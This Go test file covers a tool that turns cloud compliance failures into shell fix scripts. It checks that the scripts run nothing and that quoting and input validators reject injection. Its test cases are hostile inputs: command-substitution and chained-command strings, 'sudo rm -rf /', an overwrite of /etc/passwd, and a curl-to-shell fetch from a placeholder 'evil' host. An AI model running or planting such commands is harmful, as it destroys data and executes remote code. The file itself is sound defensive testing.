package remediation

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

func requireBash(t *testing.T) string {
	t.Helper()
	bash, err := exec.LookPath("bash")
	if err != nil {
		t.Skip("bash not available")
	}
	return bash
}

// runScript runs a generated script under bash in its own directory and
// reports whether it left the marker file the booby-trapped input tries to
// create.
func runScript(t *testing.T, script string) (markerCreated bool, output string) {
	t.Helper()
	bash := requireBash(t)
	dir := t.TempDir()
	path := filepath.Join(dir, "fix.sh")
	if err := os.WriteFile(path, []byte(script), 0o700); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command(bash, "-n", path).CombinedOutput(); err != nil {
		t.Fatalf("bash -n rejected the script: %v\n%s\n--- script ---\n%s", err, out, script)
	}
	cmd := exec.Command(bash, path)
	cmd.Dir = dir
	out, _ := cmd.CombinedOutput()
	_, err := os.Stat(filepath.Join(dir, "PWNED"))
	return err == nil, string(out)
}

// "Uncomment to run" HIGH fixes had one "# " in front of a multi-line detail,
// so lines two onward ran; CRITICAL fixes were written live.
func TestGenerateFixScriptRunsNothing(t *testing.T) {
	results := []ControlResult{
		{Control: "CC-1", Status: "FAIL", Severity: "CRITICAL", RemediationDetail: "1. Sign in as root\ntouch PWNED"},
		{Control: "CC-2", Status: "FAIL", Severity: "HIGH", RemediationDetail: "aws iam create-group Developers\ntouch PWNED\r\ntouch PWNED"},
		{Control: "CC-3\ntouch PWNED", Status: "FAIL", Severity: "HIGH", RemediationDetail: "x"},
	}
	out := filepath.Join(t.TempDir(), "fixes.sh")
	if err := GenerateFixScript(results, out); err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(out)
	if err != nil {
		t.Fatal(err)
	}
	for _, line := range strings.Split(string(data), "\n") {
		trimmed := strings.TrimSpace(line)
		if trimmed == "" || strings.HasPrefix(trimmed, "#") || strings.HasPrefix(trimmed, "set -e") || strings.HasPrefix(trimmed, "echo '") {
			continue
		}
		t.Errorf("live line in fix script: %q", line)
	}
	if marker, output := runScript(t, string(data)); marker {
		t.Fatalf("running the fix script executed remediation text\n%s", output)
	}
}

func TestShellQuoteSurvivesBash(t *testing.T) {
	bash := requireBash(t)
	for _, s := range []string{
		"plain", "it's", "'", "''", `$(touch PWNED)`, "`touch PWNED`", "a;touch PWNED", "line\nbreak", `back\slash`, "",
	} {
		dir := t.TempDir()
		cmd := exec.Command(bash, "-c", "printf %s "+ShellQuote(s))
		cmd.Dir = dir
		got, err := cmd.Output()
		if err != nil {
			t.Fatalf("%q: %v", s, err)
		}
		if string(got) != s {
			t.Errorf("ShellQuote(%q) came back as %q", s, got)
		}
		if _, err := os.Stat(filepath.Join(dir, "PWNED")); err == nil {
			t.Errorf("ShellQuote(%q) executed its content", s)
		}
	}
}

func TestRunnableCommand(t *testing.T) {
	cases := map[string]bool{
		"aws s3api put-public-access-block --bucket my-bucket --public-access-block-configuration BlockPublicAcls=true": true,
		`aws s3api put-bucket-encryption --bucket b --server-side-encryption-configuration '{"Rules":[]}'`:              true,
		"gcloud sql instances patch db1 --require-ssl":                                                                  true,
		"aws s3 ls; touch PWNED":                                               false,
		"aws s3 ls && aws iam delete-user --user-name x":                       false,
		"aws s3 ls | sh":                                                       false,
		"aws s3 ls $(touch PWNED)":                                             false,
		"aws s3 ls `touch PWNED`":                                              false,
		"aws s3 ls > /etc/passwd":                                              false,
		"aws cloudtrail update-trail --name <trail-name>":                      false,
		"aws iam delete-access-key --access-key-id OLD_KEY_ID --user-name bob": false,
		"bash -c 'touch PWNED'":                                                false,
		"curl https://example.com/x":                                           false,
		"sudo rm -rf /":                                                        false,
		"echo hello":                                                           false,
		"1. Sign in as root user":                                              false,
		"":                                                                     false,
	}
	for line, want := range cases {
		if got := RunnableCommand(line); got != want {
			t.Errorf("RunnableCommand(%q) = %v, want %v", line, got, want)
		}
	}
}

func TestSafeResource(t *testing.T) {
	cases := map[string]bool{
		"my-bucket.logs": true,
		"arn:aws:iam::123456789012:user/alice@example.com": true,
		"sg-0abc123":                        true,
		"":                                  false,
		"https://s3.console.aws.amazon.com": false,
		"two words":                         false,
		"x;curl${IFS}evil|sh":               false,
		"$(touch PWNED)":                    false,
		"a'b":                               false,
		"a\nb":                              false,
	}
	for r, want := range cases {
		if got := SafeResource(r); got != want {
			t.Errorf("SafeResource(%q) = %v, want %v", r, got, want)
		}
	}
}
